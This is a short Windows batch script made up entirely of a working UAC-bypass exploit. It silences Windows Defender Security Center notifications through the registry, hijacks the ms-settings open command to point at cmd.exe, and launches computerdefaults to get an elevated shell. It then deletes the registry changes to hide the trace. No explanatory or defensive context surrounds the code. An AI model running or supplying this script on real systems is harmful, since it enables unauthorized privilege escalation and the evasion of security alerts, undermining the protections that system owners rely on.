@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f
cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d "cmd.exe" /f
computerdefaults
reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f
exit